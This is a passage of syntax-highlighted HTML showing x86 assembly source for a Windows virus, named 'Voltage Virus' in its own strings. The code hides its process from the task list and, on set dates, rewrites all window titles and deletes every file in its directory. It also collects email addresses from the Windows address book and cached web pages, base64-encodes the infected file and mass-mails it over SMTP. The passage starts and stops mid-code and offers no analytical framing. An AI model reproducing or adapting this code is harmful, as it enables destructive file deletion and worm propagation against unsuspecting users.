    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EDB88320h</span><span class="sc0">
</span><span class="sc5">@@3</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">@@2</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">@@1</span><span class="sc0">
    </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">@@4</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">ret</span><span class="sc0">

    
        
</span><span class="sc5">HideVirus</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">;hide virus process from alt+crtl+del menu</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">RSP</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kernel32base</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">__GetProcAddress</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">ExitRSP</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">ExitRSP</span><span class="sc4">:</span><span class="sc6">ret</span><span class="sc0">
    
    </span><span class="sc5">RSP</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"RegisterServiceProcess"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    
        
    
</span><span class="sc5">PayLoad</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SYSTEMTIME</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">GetLocalTime</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">wMonth</span><span class="sc4">],</span><span class="sc2">0ch</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">ExitPayload</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">wDay</span><span class="sc4">],</span><span class="sc2">1eh</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Payload2</span><span class="sc0">
    </span><span class="sc1">;replace all windows title with copyright message</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0ffffh</span><span class="sc0">
</span><span class="sc5">payl0ad</span><span class="sc4">:</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CopyRight</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SetWindowText</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">payl0ad</span><span class="sc0">
    </span><span class="sc1">;show payload message box:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">MB_SYSTEMMODAL</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">MB_ICONINFORMATION</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CopyRight</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MessageBox</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">Payload2</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">;fuck ppl data</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">wDay</span><span class="sc4">],</span><span class="sc2">1dh</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">ExitPayload</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FileDirectory</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SetCurrentDirectory</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;goto running program directory</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WIN32_FIND_DATA</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">search_mask</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FindFirstFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">INVALID_HANDLE_VALUE</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">ExitPayload</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hfind</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">;save search handle</span><span class="sc0">
</span><span class="sc5">@Love</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc9">IF</span><span class="sc0">  </span><span class="sc5">DEBUG</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">MB_YESNO</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">warning2</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">cFileName</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MessageBox</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">IDYES</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">SkipFile</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">cFileName</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">DeleteFile</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">SkipFile</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc9">IF</span><span class="sc0">  </span><span class="sc5">DEBUG</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">MB_YESNO</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">StopPayload</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">cFileName</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MessageBox</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">IDYES</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">ExitPayload</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WIN32_FIND_DATA</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hfind</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FindNextFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">@Love</span><span class="sc0">
</span><span class="sc5">ExitPayload</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    
    </span><span class="sc5">MB_SYSTEMMODAL</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00001000h</span><span class="sc0">
    </span><span class="sc5">MB_ICONINFORMATION</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000040h</span><span class="sc0">
    
</span><span class="sc9">IF</span><span class="sc0">  </span><span class="sc5">DEBUG</span><span class="sc0">
    </span><span class="sc5">warning2</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Voltage Virus is going to delete this file:"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">StopPayload</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Stop Payload ?"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">
    
    </span><span class="sc5">hfind</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">search_mask</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"*.*"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    
    
</span><span class="sc5">WIN32_FIND_DATA</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc5">dwFileAttributes</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">ftCreationTime</span><span class="sc0">      </span><span class="sc9">dq</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">ftLastAccessTime</span><span class="sc0">    </span><span class="sc9">dq</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">ftLastWriteTime</span><span class="sc0">     </span><span class="sc9">dq</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">nFileSizeHigh</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">nFileSizeLow</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">dwReserved0</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">dwReserved1</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">cFileName</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ffh</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">cAlternateFileName</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">14</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
    
    
    
</span><span class="sc5">GetADVAPI32Apis</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ADVAPI32dll</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadLibrary</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">NumberOfRegFunctions</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">reg_functions_sz</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">reg_function_addresses</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_apis</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc5">ADVAPI32dll</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"ADVAPI32.DLL"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    
    </span><span class="sc5">reg_functions_sz</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc5">_RegOpenKeyExA</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"RegOpenKeyExA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">_RegSetValueExA</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"RegSetValueExA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">_RegCloseKey</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"RegCloseKey"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">_RegQueryValueEx</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"RegQueryValueExA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    
    </span><span class="sc5">reg_function_addresses</span><span class="sc4">:</span><span class="sc0">
    
    </span><span class="sc5">RegOpenKeyEx</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">RegSetValueEx</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">RegCloseKey</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">RegQueryValueEx</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    
    </span><span class="sc5">NumberOfRegFunctions</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
    
    
    
</span><span class="sc5">MassMail</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">;send the virus to all email addresses that the virus</span><span class="sc0">
    </span><span class="sc1">;found in the Windows address book file.and temporary</span><span class="sc0">
    </span><span class="sc1">;internet files</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">                  </span><span class="sc1">;set SEH</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MM_SEH_Handler</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CheckConditions</span><span class="sc0">         </span><span class="sc1">;check for some conditions before sending mails</span><span class="sc0">
    </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">ExitMM</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">AllowOnlyOneRun</span><span class="sc0">         </span><span class="sc1">;use mutex to alow only one execute of the mail</span><span class="sc0">
    </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">ExitMM</span><span class="sc0">              </span><span class="sc1">;worm</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetWinsockApis</span><span class="sc0">          </span><span class="sc1">;get all needed apis from winsock library   </span><span class="sc0">
    </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">ExitMM</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetSMTPServer</span><span class="sc0">           </span><span class="sc1">;get the default smtp server from the registry</span><span class="sc0">
    </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">FreeWSLibraryAndExit</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CreateVirusBase64Image</span><span class="sc0">      </span><span class="sc1">;base64 encode of infected file</span><span class="sc0">
    </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">FreeWSLibraryAndExit</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ScanWAB</span><span class="sc0">             </span><span class="sc1">;get email addresses from the windows address book</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SearchEmailsInHTMFiles</span><span class="sc0">      </span><span class="sc1">;and also from temporary internet files</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ConnectToServer</span><span class="sc0">         </span><span class="sc1">;connect to server</span><span class="sc0">
    </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">FreeBase64Mem</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">GetTickCount</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MessageNumber</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">    </span><span class="sc1">;select random message</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__recv</span><span class="sc0">              </span><span class="sc1">;recv server message:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">SOCKET_ERR</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">Disconnect</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">Disconnect</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">GetBuffer</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc3">" 022"</span><span class="sc0">      </span><span class="sc1">;is 220 ?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Disconnect</span><span class="sc0">
    </span><span class="sc1">;send HELO command:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">SizeOfHELO</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">HELO</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">vsocket</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">send</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">SOCKET_ERR</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">Disconnect</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__recv</span><span class="sc0">              </span><span class="sc1">;get server message</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">SOCKET_ERR</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">Disconnect</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">Disconnect</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">GetBuffer</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc3">" 052"</span><span class="sc0">      </span><span class="sc1">;is 250 ?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Disconnect</span><span class="sc0">
    </span><span class="sc1">;send the mail from command:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MessageNumber</span><span class="sc4">],</span><span class="sc2">32h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">mfrom</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">SizeOfMailFrom1</span><span class="sc0">
